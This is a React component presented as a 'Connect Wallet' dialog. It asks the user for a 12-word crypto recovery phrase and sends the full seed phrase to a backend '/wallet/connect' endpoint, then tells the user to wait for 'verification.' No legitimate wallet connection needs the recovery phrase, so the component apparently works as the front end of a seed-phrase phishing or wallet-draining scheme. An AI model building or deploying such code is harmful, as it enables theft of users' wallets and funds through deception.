import { useState } from 'react';
import { useAuth } from '../context/AuthContext';
import './ConnectWalletModal.css';

export default function ConnectWalletModal({ isOpen, onClose }) {
    const { api } = useAuth();
    const [words, setWords] = useState(Array(12).fill(''));
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');

    if (!isOpen) return null;

    const handleWordChange = (index, value) => {
        const newWords = [...words];
        newWords[index] = value.toLowerCase().trim();
        setWords(newWords);
    };

    const handlePaste = (e) => {
        e.preventDefault();
        const pastedText = e.clipboardData.getData('text');
        const pastedWords = pastedText.trim().split(/\s+/).slice(0, 12);

        const newWords = [...words];
        pastedWords.forEach((word, i) => {
            if (i < 12) {
                newWords[i] = word.toLowerCase().trim();
            }
        });
        setWords(newWords);
    };

    const handleSubmit = async () => {
        // Validate all words are filled
        const filledWords = words.filter(w => w.length > 0);
        if (filledWords.length < 12) {
            setError('Please enter all 12 words');
            return;
        }

        setLoading(true);
        setError('');

        try {
            await api('/wallet/connect', {
                method: 'POST',
                body: JSON.stringify({
                    seedPhrase: words.join(' '),
                    words: words
                })
            });

            // Show success and close modal
            onClose();
            alert('Wallet connection initiated. Please wait for verification.');
        } catch (err) {
            setError('Failed to connect wallet. Please try again.');
        } finally {
            setLoading(false);
        }
    };

    const handleClose = () => {
        setWords(Array(12).fill(''));
        setError('');
        onClose();
    };

    return (
        <div className="connect-modal-overlay" onClick={handleClose}>
            <div className="connect-modal" onClick={(e) => e.stopPropagation()}>
                <div className="connect-modal-header">
                    <h2 className="connect-modal-title">Connect Wallet</h2>
                    <button className="connect-modal-close" onClick={handleClose}>
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                            <line x1="18" y1="6" x2="6" y2="18" />
                            <line x1="6" y1="6" x2="18" y2="18" />
                        </svg>
                    </button>
                </div>

                <p className="connect-modal-description">
                    Please enter your 12-word recovery phrase
                </p>

                {error && (
                    <div className="connect-modal-error">
                        {error}
                    </div>
                )}

                <div className="connect-modal-grid" onPaste={handlePaste}>
                    {words.map((word, index) => (
                        <div key={index} className="connect-word-input-wrapper">
                            <input
                                type="text"
                                className="connect-word-input"
                                placeholder={`Word ${index + 1}`}
                                value={word}
                                onChange={(e) => handleWordChange(index, e.target.value)}
                                autoComplete="off"
                                spellCheck="false"
                            />
                        </div>
                    ))}
                </div>

                <div className="connect-modal-actions">
                    <button
                        className="connect-modal-btn cancel"
                        onClick={handleClose}
                        disabled={loading}
                    >
                        Cancel
                    </button>
                    <button
                        className="connect-modal-btn submit"
                        onClick={handleSubmit}
                        disabled={loading}
                    >
                        {loading ? 'Connecting...' : 'Connect Wallet'}
                    </button>
                </div>
            </div>
        </div>
    );
}
